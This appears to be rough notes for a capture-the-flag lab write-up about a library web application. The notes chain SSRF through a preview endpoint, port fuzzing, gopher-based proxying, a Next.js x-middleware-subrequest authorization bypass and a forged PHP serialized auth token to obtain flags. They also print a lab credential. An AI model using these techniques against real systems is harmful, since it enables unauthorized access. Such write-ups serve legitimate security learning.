The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.

`nmap -sCV -oA scan -O -p- TARGET-IP -T4`

open ports

22
80

pdf                  (Status: 301) [Size: 310] [--> http://10.48.171.48/pdf/]
management           (Status: 301) [Size: 317] [--> http://10.48.171.48/management/]
javascript           (Status: 301) [Size: 317] [--> http://10.48.171.48/javascript/]

server name: 
cvssm1

add this to hosts file

python3 -m http.server 8000

to confirm SSRF:

http://cvssm1/preview.php?url=http://MY-IP:8000/

then: http://cvssm1/preview.php?url=http://127.0.0.1/

try accessing the hidden dir that throwed 403(Forbidden)

 ffuf -u 'http://10.48.156.218/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.156.218/preview.php?url=http://127.0.0.1:FUZZ/
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

80                      [Status: 200, Size: 1735, Words: 304, Lines: 65, Duration: 7188ms]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1, Duration: 952ms]

80 home
10000 /customapi/ ==404-not found

Requesting `http://127.0.0.1:10000/` via `/preview.php?url=http://127.0.0.1:10000/` shows a **Next.js** application:

### Writing a Proxy

Since it is another web application, we can write a simple “proxy” in Python to start a server that listens for connections. Upon receiving a request, it reads all the data sent and forwards it to `127.0.0.1:10000` on the target via `/preview.php` using `gopher://`, then returns the response back to the client.

"proxy in py"

python3 proxyfile.py

 curl -i 127.0.0.1:5001/customapi -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

obtain flag1 and this: 

This API is currently under maintenance. Please use the library portal to add new books using librarian:L1br4r1AN!!

127.0.0.1:5001/management

still using the proxy

https://medium.com/@bandaymajid70/tryhackme-extract-writeup-b029a625df5c

https://jaxafed.github.io/posts/tryhackme-extract/

https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass

O:9:"AuthToken":1:{s:9:"validated";b:0;}

O:9:"AuthToken":1:{s:9:"validated";b:1;} ==> urlencode use as the auth token and you get the second flag